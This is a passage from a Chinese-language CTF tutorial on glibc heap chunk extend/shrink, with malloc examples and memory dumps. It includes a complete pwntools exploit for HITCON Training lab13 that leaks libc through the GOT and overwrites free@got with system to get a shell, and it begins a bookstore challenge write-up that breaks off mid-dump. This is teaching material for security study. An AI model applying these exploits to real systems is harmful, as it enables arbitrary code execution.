chunk\n\n\n\u4e4b\u540e\uff0c\u6211\u4eec\u628a chunk1 \u7684 size \u57df\u66f4\u6539\u4e3a 0x41\uff0c0x41 \u662f\u56e0\u4e3a chunk \u7684 size \u57df\u5305\u542b\u4e86\u7528\u6237\u63a7\u5236\u7684\u5927\u5c0f\u548c header \u7684\u5927\u5c0f\u3002\u5982\u4e0a\u6240\u793a\u6b63\u597d\u5927\u5c0f\u4e3a0x40\u3002\u5728\u9898\u76ee\u4e2d\u8fd9\u4e00\u6b65\u53ef\u4ee5\u7531\u5806\u6ea2\u51fa\u5f97\u5230\u3002\n\n0x602000:   0x0000000000000000  0x0000000000000041 \n=== \u7be1\u6539\u5927\u5c0f\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000021\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000020fc1 \n\n\n\u6267\u884c free \u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230 chunk2 \u4e0e chunk1 \u5408\u6210\u4e00\u4e2a 0x40 \u5927\u5c0f\u7684 chunk\uff0c\u4e00\u8d77\u91ca\u653e\u4e86\u3002\n\nFastbins[idx=0, size=0x10] 0x00\nFastbins[idx=1, size=0x20] 0x00\nFastbins[idx=2, size=0x30]  \u2190  Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE) \nFastbins[idx=3, size=0x40] 0x00\nFastbins[idx=4, size=0x50] 0x00\nFastbins[idx=5, size=0x60] 0x00\nFastbins[idx=6, size=0x70] 0x00\n\n\n\u4e4b\u540e\u6211\u4eec\u901a\u8fc7 malloc(0x30) \u5f97\u5230 chunk1+chunk2 \u7684\u5757\uff0c\u6b64\u65f6\u5c31\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236chunk2\u4e2d\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u4e5f\u628a\u8fd9\u79cd\u72b6\u6001\u79f0\u4e3a overlapping chunk\u3002\n\ncall   0x400450 \nmalloc@plt\n\nmov    QWORD PTR [rbp-0x8], rax\n\nrax = 0x602010\n\n\n\n\u57fa\u672c\u793a\u4f8b2\n\n\n\u901a\u8fc7\u4e4b\u524d\u6df1\u5165\u7406\u89e3\u5806\u7684\u5b9e\u73b0\u90e8\u5206\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u5f97\u77e5\u5904\u4e8e fastbin \u8303\u56f4\u7684 chunk \u91ca\u653e\u540e\u4f1a\u88ab\u7f6e\u5165 fastbin \u94fe\u8868\u4e2d\uff0c\u800c\u4e0d\u5904\u4e8e\u8fd9\u4e2a\u8303\u56f4\u7684 chunk \u88ab\u91ca\u653e\u540e\u4f1a\u88ab\u7f6e\u4e8eunsorted bin\u94fe\u8868\u4e2d\u3002\n\u4ee5\u4e0b\u8fd9\u4e2a\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528 0x80 \u8fd9\u4e2a\u5927\u5c0f\u6765\u5206\u914d\u5806\uff08\u4f5c\u4e3a\u5bf9\u6bd4\uff0cfastbin \u9ed8\u8ba4\u7684\u6700\u5927\u7684 chunk \u53ef\u4f7f\u7528\u8303\u56f4\u662f0x70\uff09\n\nint main()\n{\n    void *ptr,*ptr1;\n\n    ptr=malloc(0x80);//\u5206\u914d\u7b2c\u4e00\u4e2a 0x80 \u7684chunk1\n    malloc(0x10); //\u5206\u914d\u7b2c\u4e8c\u4e2a 0x10 \u7684chunk2\n    malloc(0x10); //\u9632\u6b62\u4e0etop chunk\u5408\u5e76\n\n    *(int *)((int)ptr-0x8)=0xb1;\n    free(ptr);\n    ptr1=malloc(0xa0);\n}\n\n\n\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u56e0\u4e3a\u5206\u914d\u7684 size \u4e0d\u5904\u4e8e fastbin \u7684\u8303\u56f4\uff0c\u56e0\u6b64\u5728\u91ca\u653e\u65f6\u5982\u679c\u4e0e top chunk \u76f8\u8fde\u4f1a\u5bfc\u81f4\u548ctop chunk\u5408\u5e76\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u989d\u5916\u5206\u914d\u4e00\u4e2achunk\uff0c\u628a\u91ca\u653e\u7684\u5757\u4e0etop chunk\u9694\u5f00\u3002\n\n0x602000:   0x0000000000000000  0x00000000000000b1 \n===chunk1 \u7be1\u6539size\u57df\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000000  0x0000000000000021 \n=== chunk2\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000000021 \n=== \u9632\u6b62\u5408\u5e76\u7684chunk\n0x6020c0:   0x0000000000000000  0x0000000000000000\n0x6020d0:   0x0000000000000000  0x0000000000020f31 \n=== top chunk\n\n\n\u91ca\u653e\u540e\uff0cchunk1 \u628a chunk2 \u7684\u5185\u5bb9\u541e\u5e76\u6389\u5e76\u4e00\u8d77\u7f6e\u5165unsorted bin\n\n0x602000:   0x0000000000000000  0x00000000000000b1 \n=== \u88ab\u653e\u5165unsorted bin\n0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000000  0x0000000000000021\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x00000000000000b0  0x0000000000000020 \n=== \u6ce8\u610f\u6b64\u5904\u6807\u8bb0\u4e3a\u7a7a\n0x6020c0:   0x0000000000000000  0x0000000000000000\n0x6020d0:   0x0000000000000000  0x0000000000020f31 \n=== top chunk\n\n\n\n[+] unsorted_bins[0]: fw=0x602000, bk=0x602000\n \u2192   Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE)\n\n\n\u518d\u6b21\u8fdb\u884c\u5206\u914d\u7684\u65f6\u5019\u5c31\u4f1a\u53d6\u56de chunk1 \u548c chunk2 \u7684\u7a7a\u95f4\uff0c\u6b64\u65f6\u6211\u4eec\u5c31\u53ef\u4ee5\u63a7\u5236 chunk2 \u4e2d\u7684\u5185\u5bb9\n\n     0x4005b0 \nmain+74\n        call   0x400450 \nmalloc@plt\n\n \u2192   0x4005b5 \nmain+79\n        mov    QWORD PTR [rbp-0x8], rax\n\n     rax : 0x0000000000602010\n\n\n\n\u57fa\u672c\u793a\u4f8b3\n\n\n\u793a\u4f8b3\u662f\u5728\u793a\u4f8b2\u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u7684\uff0c\u8fd9\u6b21\u6211\u4eec\u5148\u91ca\u653e chunk1\uff0c\u7136\u540e\u518d\u4fee\u6539\u5904\u4e8e unsorted bin \u4e2d\u7684 chunk1 \u7684size\u57df\u3002\n\nint main()\n{\n    void *ptr,*ptr1;\n\n    ptr=malloc(0x80);//\u5206\u914d\u7b2c\u4e00\u4e2a0x80\u7684chunk1\n    malloc(0x10);//\u5206\u914d\u7b2c\u4e8c\u4e2a0x10\u7684chunk2\n\n    free(ptr);//\u9996\u5148\u8fdb\u884c\u91ca\u653e\uff0c\u4f7f\u5f97chunk1\u8fdb\u5165unsorted bin\n\n    *(int *)((int)ptr-0x8)=0xb1;\n    ptr1=malloc(0xa0);\n}\n\n\n\u4e24\u6b21 malloc \u4e4b\u540e\u7684\u7ed3\u679c\u5982\u4e0b\n\n0x602000:   0x0000000000000000  0x0000000000000091 \n=== chunk 1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000000  0x0000000000000021 \n=== chunk 2\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000020f51\n\n\n\u6211\u4eec\u9996\u5148\u91ca\u653echunk1\u4f7f\u5b83\u8fdb\u5165unsorted bin\u4e2d\n\n     unsorted_bins[0]: fw=0x602000, bk=0x602000\n \u2192   Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)\n\n0x602000:   0x0000000000000000  0x0000000000000091 \n=== \u8fdb\u5165unsorted bin\n0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000090  0x0000000000000020 \n=== chunk 2\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000020f51 \n=== top chunk\n\n\n\u7136\u540e\u7be1\u6539chunk1\u7684size\u57df\n\n0x602000:   0x0000000000000000  0x00000000000000b1 \n=== size\u57df\u88ab\u7be1\u6539\n0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000090  0x0000000000000020\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000020f51\n\n\n\u6b64\u65f6\u518d\u8fdb\u884c malloc \u5206\u914d\u5c31\u53ef\u4ee5\u5f97\u5230 chunk1+chunk2 \u7684\u5806\u5757\uff0c\u4ece\u800c\u63a7\u5236\u4e86chunk2 \u7684\u5185\u5bb9\u3002\n\n\nChunk Extend/Shrink \u53ef\u4ee5\u505a\u4ec0\u4e48\n\n\n\u4e00\u822c\u6765\u8bf4\uff0c\u8fd9\u79cd\u6280\u672f\u5e76\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\uff0c\u4f46\u662f\u53ef\u4ee5\u5bfc\u81f4 chunk overlapping\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5b8c\u6574\u7684\u63a7\u5236\u8fd9\u4e2a\u5806\u5757 chunk \u4e2d\u7684\u5185\u5bb9\u3002\u5982\u679c chunk \u5b58\u5728\u5b57\u7b26\u4e32\u6307\u9488\u3001\u51fd\u6570\u6307\u9488\u7b49\uff0c\u5c31\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u6307\u9488\u6765\u8fdb\u884c\u4fe1\u606f\u6cc4\u6f0f\u548c\u63a7\u5236\u6267\u884c\u6d41\u7a0b\u3002\u5982\u679c\u4e0d\u5b58\u5728\u7c7b\u4f3c\u7684\u57df\u4e5f\u53ef\u4ee5\u901a\u8fc7\u63a7\u5236 chunk header \u4e2d\u7684\u6570\u636e\u6765\u5b9e\u73b0 fastbin attack \u7b49\u5229\u7528\u3002\n\n\nHITCON Trainging lab13\n\n\n\u57fa\u672c\u4fe1\u606f\n\n\n\u279c  hitcontraning_lab13 git:\n(\nmaster\n)\n file heapcreator\nheapcreator: ELF \n64\n-bit LSB executable, x86-64, version \n1\n \n(\nSYSV\n)\n, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, \nfor\n GNU/Linux \n2\n.6.32, BuildID\n[\nsha1\n]=\n5e69111eca74cba2fb372dfcd3a59f93ca58f858, not stripped\n\u279c  hitcontraning_lab13 git:\n(\nmaster\n)\n checksec heapcreator\n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/hitcontraning_lab13/heapcreator\n\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x400000\n)\n\n\n\n\n\n\u7a0b\u5e8f\u4e3a 64 \u4f4d\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u4fdd\u62a4\u4e0e NX \u4fdd\u62a4\u3002\n\n\n\u57fa\u672c\u529f\u80fd\n\n\n\u7a0b\u5e8f\u5927\u6982\u662f\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684\u5806\u5206\u914d\u5668\uff0c\u6bcf\u4e2a\u5806\u4e3b\u8981\u6709\u4e24\u4e2a\u6210\u5458\uff1a\u5927\u5c0f\u4e0e\u5185\u5bb9\u6307\u9488\u3002\u4e3b\u8981\u529f\u80fd\u5982\u4e0b\n\n\n\n\n\u521b\u5efa\u5806\uff0c\u6839\u636e\u7528\u6237\u8f93\u5165\u7684\u957f\u5ea6\uff0c\u7533\u8bf7\u5bf9\u5e94\u5185\u5b58\u7a7a\u95f4\uff0c\u5e76\u5229\u7528 read \u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u5185\u5bb9\u3002\u8fd9\u91cc\u957f\u5ea6\u6ca1\u6709\u8fdb\u884c\u68c0\u6d4b\uff0c\u5f53\u957f\u5ea6\u4e3a\u8d1f\u6570\u65f6\uff0c\u4f1a\u51fa\u73b0\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002\u5f53\u7136\uff0c\u524d\u63d0\u662f\u53ef\u4ee5\u8fdb\u884c malloc\u3002\u6b64\u5916\uff0c\u8fd9\u91cc\u8bfb\u53d6\u4e4b\u540e\u5e76\u6ca1\u6709\u8bbe\u7f6e NULL\u3002\n\n\n\u7f16\u8f91\u5806\uff0c\u6839\u636e\u6307\u5b9a\u7684\u7d22\u5f15\u4ee5\u53ca\u4e4b\u524d\u5b58\u50a8\u7684\u5806\u7684\u5927\u5c0f\u8bfb\u53d6\u6307\u5b9a\u5185\u5bb9\uff0c\u4f46\u662f\u8fd9\u91cc\u8bfb\u5165\u7684\u957f\u5ea6\u4f1a\u6bd4\u4e4b\u524d\u5927 1\uff0c\u6240\u4ee5\u4f1a\n\u5b58\u5728 off by one \u7684\u6f0f\u6d1e\n\u3002\n\n\n\u5c55\u793a\u5806\uff0c\u8f93\u51fa\u6307\u5b9a\u7d22\u5f15\u5806\u7684\u5927\u5c0f\u4ee5\u53ca\u5185\u5bb9\u3002\n\n\n\u5220\u9664\u5806\uff0c\u5220\u9664\u6307\u5b9a\u5806\uff0c\u5e76\u4e14\u5c06\u5bf9\u5e94\u6307\u9488\u8bbe\u7f6e\u4e3a\u4e86 NULL\u3002\n\n\n\n\n\u5229\u7528\n\n\n\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u5229\u7528off by one \u6f0f\u6d1e\u8986\u76d6\u4e0b\u4e00\u4e2achunk \u7684 size \u5b57\u6bb5\uff0c\u4ece\u800c\u6784\u9020\u4f2a\u9020\u7684 chunk \u5927\u5c0f\u3002\n\n\n\u7533\u8bf7\u4f2a\u9020\u7684 chunk \u5927\u5c0f\uff0c\u4ece\u800c\u4ea7\u751f chunk overlap\uff0c\u8fdb\u800c\u4fee\u6539\u5173\u952e\u6307\u9488\u3002\n\n\n\n\n\u66f4\u52a0\u5177\u4f53\u7684\u8fd8\u662f\u76f4\u63a5\u770b\u811a\u672c\u5427\u3002\n\n\n#!/usr/bin/env python\n\n\n# -*- coding: utf-8 -*-\n\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\nr\n \n=\n \nprocess\n(\n./heapcreator\n)\n\n\nheap\n \n=\n \nELF\n(\n./heapcreator\n)\n\n\nlibc\n \n=\n \nELF\n(\n./libc.so.6\n)\n\n\n\n\ndef\n \ncreate\n(\nsize\n,\n \ncontent\n):\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\n1\n)\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\nstr\n(\nsize\n))\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\ncontent\n)\n\n\n\n\ndef\n \nedit\n(\nidx\n,\n \ncontent\n):\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\n2\n)\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\nstr\n(\nidx\n))\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\ncontent\n)\n\n\n\n\ndef\n \nshow\n(\nidx\n):\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\n3\n)\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\nstr\n(\nidx\n))\n\n\n\n\ndef\n \ndelete\n(\nidx\n):\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\n4\n)\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\nstr\n(\nidx\n))\n\n\n\n\nfree_got\n \n=\n \n0x602018\n\n\ncreate\n(\n0x18\n,\n \ndada\n)\n  \n# 0\n\n\ncreate\n(\n0x10\n,\n \nddaa\n)\n  \n# 1\n\n\n# overwrite heap 1\ns struct\ns size to 0x41\n\n\nedit\n(\n0\n,\n \n/bin/sh\n\\x00\n \n+\n \na\n \n*\n \n0x10\n \n+\n \n\\x41\n)\n\n\n# trigger heap 1\ns struct to fastbin 0x40\n\n\n# heap 1\ns content to fastbin 0x20\n\n\ndelete\n(\n1\n)\n\n\n# new heap 1\ns struct will point to old heap 1\ns content, size 0x20\n\n\n# new heap 1\ns content will point to old heap 1\ns struct, size 0x30\n\n\n# that is to say we can overwrite new heap 1\ns struct\n\n\n# here we overwrite its heap content pointer to free@got\n\n\ncreate\n(\n0x30\n,\n \np64\n(\n0\n)\n \n*\n \n4\n \n+\n \np64\n(\n0x30\n)\n \n+\n \np64\n(\nheap\n.\ngot\n[\nfree\n]))\n  \n#1\n\n\n# leak freeaddr\n\n\nshow\n(\n1\n)\n\n\nr\n.\nrecvuntil\n(\nContent : \n)\n\n\ndata\n \n=\n \nr\n.\nrecvuntil\n(\nDone !\n)\n\n\n\nfree_addr\n \n=\n \nu64\n(\ndata\n.\nsplit\n(\n\\n\n)[\n0\n]\n.\nljust\n(\n8\n,\n \n\\x00\n))\n\n\nlibc_base\n \n=\n \nfree_addr\n \n-\n \nlibc\n.\nsymbols\n[\nfree\n]\n\n\nlog\n.\nsuccess\n(\nlibc base addr: \n \n+\n \nhex\n(\nlibc_base\n))\n\n\nsystem_addr\n \n=\n \nlibc_base\n \n+\n \nlibc\n.\nsymbols\n[\nsystem\n]\n\n\n#gdb.attach(r)\n\n\n# overwrite free@got with system addr\n\n\nedit\n(\n1\n,\n \np64\n(\nsystem_addr\n))\n\n\n# trigger system(\n/bin/sh\n)\n\n\ndelete\n(\n0\n)\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\n2015 hacklu bookstore\n\n\n\u57fa\u672c\u4fe1\u606f\n\n\n\u279c  2015_hacklu_bookstore git:\n(\nmaster\n)\n file books    \nbooks: ELF \n64\n-bit LSB executable, x86-64, version \n1\n \n(\nSYSV\n)\n, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, \nfor\n GNU/Linux \n2\n.6.32, BuildID\n[\nsha1\n]=\n3a15f5a8e83e55c535d220473fa76c314d26b124, stripped\n\u279c  2015_hacklu_bookstore git:\n(\nmaster\n)\n checksec books    \n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/2015_hacklu_bookstore/books\n\n    Arch:     amd64-64-little\n    RELRO:    No RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x400000\n)\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u8be5\u7a0b\u5e8f\u662f\u52a8\u6001\u94fe\u63a5\u7684 64 \u4f4d\u7a0b\u5e8f\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u4e0e NX \u4fdd\u62a4\u3002\n\n\n\u57fa\u672c\u529f\u80fd\n\n\n\u8be5\u7a0b\u5e8f\u7684\u4e3b\u8981\u529f\u80fd\u662f\u8ba2\u4e66\uff0c\u5177\u4f53\u5982\u4e0b\n\n\n\n\n\u6700\u591a\u53ef\u4ee5\u8ba2\u8d2d\u4e24\u672c\u4e66\u3002\n\n\n\u6839\u636e\u7f16\u53f7\u6765\u9009\u62e9\u8ba2\u8d2d\u7b2c\u51e0\u672c\u4e66\uff0c\u53ef\u4ee5\u4e3a\u6bcf\u672c\u4e66\u6dfb\u52a0\u5bf9\u5e94\u7684\u540d\u5b57\u3002\u7136\u800c\u5728\u6dfb\u52a0\u540d\u5b57\u5904\u51fa\u73b0\u4e86\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002\n\n\n\u6839\u636e\u7f16\u53f7\u6765\u5220\u9664 order\uff0c\u4f46\u662f\u8fd9\u91cc\u53ea\u662f\u5355\u7eaf\u5730 free \u6389\uff0c\u5e76\u6ca1\u6709\u7f6e\u4e3a NULL\uff0c\u56e0\u6b64\u4f1a\u51fa\u73b0 use after free \u7684\u6f0f\u6d1e\u3002\n\n\n\u63d0\u4ea4\u8ba2\u5355\uff0c\u5c06\u4e24\u672c\u4e66\u7684\u540d\u5b57\u5408\u5728\u4e00\u8d77\u3002\u8fd9\u91cc\u7531\u4e8e\u4e0a\u9762\u5806\u6ea2\u51fa\u7684\u95ee\u9898\uff0c\u8fd9\u91cc\u4e5f\u4f1a\u51fa\u73b0\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002\n\n\n\u6b64\u5916\uff0c\u5728\u7a0b\u5e8f\u9000\u51fa\u4e4b\u524d\u5b58\u5728\u4e00\u4e2a\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\n\u3002\n\n\n\n\n\u8fd9\u91cc\u867d\u7136\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u80fd\u529b\u5f88\u5f3a\uff0c\u4f46\u662f\u6240\u6709\u8fdb\u884c malloc \u7684\u5927\u5c0f\u90fd\u662f\u5b8c\u5168\u56fa\u5b9a\u7684\uff0c\u6211\u4eec\u53ea\u80fd\u501f\u52a9\u8fd9\u4e9b\u5206\u914d\u7684 chunk \u6765\u8fdb\u884c\u64cd\u4f5c\u3002\n\n\n\u5229\u7528\u601d\u8def\n\n\n\u7a0b\u5e8f\u4e2d\u4e3b\u8981\u7684\u6f0f\u6d1e\u5728\u4e8e\u5806\u6ea2\u51fa\u548c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u4f46\u662f\u5982\u679c\u60f3\u8981\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u5fc5\u7136\u9700\u8981\u6ea2\u51fa\u5bf9\u5e94\u7684dest \u6570\u7ec4\u3002\u5177\u4f53\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u5229\u7528\u5806\u6ea2\u51fa\u8fdb\u884c chunk extend\uff0c\u4f7f\u5f97\u5728 submit \u4e2d \nmalloc(0x140uLL)\n \u65f6\uff0c\u6070\u597d\u8fd4\u56de\u7b2c\u4e8c\u4e2a\u8ba2\u5355\u5904\u7684\u4f4d\u7f6e\u3002\u5728 submit \u4e4b\u524d\uff0c\u5e03\u7f6e\u597d\u5806\u5185\u5b58\u5e03\u5c40\uff0c\u4f7f\u5f97\u628a\u5b57\u7b26\u4e32\u62fc\u63a5\u540e\u6070\u597d\u53ef\u4ee5\u8986\u76d6 dest \u4e3a\u6307\u5b9a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3002\n\n\n\u901a\u8fc7\u6784\u9020 dest \u4e3a\u6307\u5b9a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff1a\u4e00\u65b9\u9762\u6cc4\u6f0f __libc_start_main_ret \u7684\u5730\u5740\uff0c\n\u4e00\u65b9\u9762\u63a7\u5236\u7a0b\u5e8f\u91cd\u65b0\u8fd4\u56de\u6267\u884c\n\u3002\u8fd9\u65f6\uff0c\u4fbf\u53ef\u4ee5\u77e5\u9053 libc \u57fa\u5730\u5740\uff0csystem \u7b49\u5730\u5740\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\u7531\u4e8e\u4e00\u65e6 submit \u4e4b\u540e\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u76f4\u63a5\u76f4\u63a5\u9000\u51fa\uff0c\u6240\u4ee5\u6211\u4eec\u6bd4\u8f83\u597d\u7684\u601d\u8def\u5c31\u662f\u4fee\u6539 fini_array \u4e2d\u7684\u53d8\u91cf\uff0c\u4ee5\u4fbf\u4e8e\u8fbe\u5230\u7a0b\u5e8f\u6267\u884c\u5b8c\u6bd5\u540e\uff0c\n\u91cd\u65b0\u8fd4\u56de\u6211\u4eec\u671f\u5f85\u7684\u4f4d\u7f6e\n\u3002\u8fd9\u91cc\u6211\u4eec\u4f1a\u4f7f\u7528\u4e00\u4e2atrick\uff0c\u7a0b\u5e8f\u6bcf\u6b21\u8bfb\u53d6\u9009\u62e9\u7684\u65f6\u5019\u4f1a\u8bfb\u53d6 128 \u5927\u5c0f\uff0c\u5728\u6808\u4e0a\u3002\u800c\u7a0b\u5e8f\u6700\u540e\u5728\u8f93\u51fa dest \u7684\u65f6\u5019\uff0c\u4e4b\u524d\u6240\u8bfb\u53d6\u7684\u90a3\u90e8\u5206\u9009\u62e9\u5fc5\u7136\u662f\u5728\u6808\u4e0a\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5982\u679c\u6211\u4eec\u5728\u6808\u4e0a\u9884\u5148\u5e03\u7f6e\u597d\u4e00\u4e9b\u63a7\u5236\u6d41\u6307\u9488\uff0c\u90a3\u5c31\u53ef\u4ee5\u6765\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002\n\n\n\u518d\u6b21\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u8986\u76d6 free@got \u4e3a system \u5730\u5740\uff0c\u4ece\u800c\u8fbe\u5230\u4efb\u610f\u547d\u4ee4\u6267\u884c\u7684\u76ee\u7684\u3002\n\n\n\n\n\u8fd9\u91cc\uff0c\u5404\u4e2a\u53c2\u6570\u7684\u504f\u79fb\u662f\n\n\n\n\nFini_array0 : 5+8=13\n\n\n__libc_start_main_ret : 5+0x1a=31\u3002\n\n\n\n\n00:0000\u2502 rsp  0x7ffe6a7f3ec8 \u2014\u25b8 0x400c93 \u25c2\u2014 mov    eax, 0\n01:0008\u2502      0x7ffe6a7f3ed0 \u25c2\u2014 0x100000000\n02:0010\u2502      0x7ffe6a7f3ed8 \u2014\u25b8 0x9f20a0 \u25c2\u2014 0x3a3120726564724f (\nOrder 1:\n)\n03:0018\u2502      0x7ffe6a7f3ee0 \u2014\u25b8 0x400d38 \u25c2\u2014 pop    rcx\n04:0020\u2502      0x7ffe6a7f3ee8 \u2014\u25b8 0x9f2010 \u25c2\u2014 0x6666666666667325 (\n%sffffff\n)\n05:0028\u2502      0x7ffe6a7f3ef0 \u2014\u25b8 0x9f20a0 \u25c2\u2014 0x3a3120726564724f (\nOrder 1:\n)\n06:0030\u2502      0x7ffe6a7f3ef8 \u2014\u25b8 0x9f2130 \u25c2\u2014 0x6564724f203a3220 (\n 2: Orde\n)\n07:0038\u2502      0x7ffe6a7f3f00 \u25c2\u2014 0xa35 /* \n5\\n\n */\n08:0040\u2502      0x7ffe6a7f3f08 \u25c2\u2014 0x0\n... \u2193\n0b:0058\u2502      0x7ffe6a7f3f20 \u25c2\u2014 0xff00000000000000\n0c:0060\u2502      0x7ffe6a7f3f28 \u25c2\u2014 0x0\n... \u2193\n0f:0078\u2502      0x7ffe6a7f3f40 \u25c2\u2014 0x5f5f00656d697474 /* \nttime\n */\n10:0080\u2502      0x7ffe6a7f3f48 \u25c2\u2014 0x7465675f6f736476 (\nvdso_get\n)\n11:0088\u2502      0x7ffe6a7f3f50 \u25c2\u2014 0x1\n12:0090\u2502      0x7ffe6a7f3f58 \u2014\u25b8 0x400cfd \u25c2\u2014 add    rbx, 1\n13:0098\u2502      0x7ffe6a7f3f60 \u25c2\u2014 0x0\n... \u2193\n15:00a8\u2502      0x7ffe6a7f3f70 \u2014\u25b8 0x400cb0 \u25c2\u2014 push   r15\n16:00b0\u2502      0x7ffe6a7f3f78 \u2014\u25b8 0x400780 \u25c2\u2014 xor    ebp, ebp\n17:00b8\u2502      0x7ffe6a7f3f80 \u2014\u25b8 0x7ffe6a7f4070 \u25c2\u2014 0x1\n18:00c0\u2502      0x7ffe6a7f3f88 \u25c2\u2014 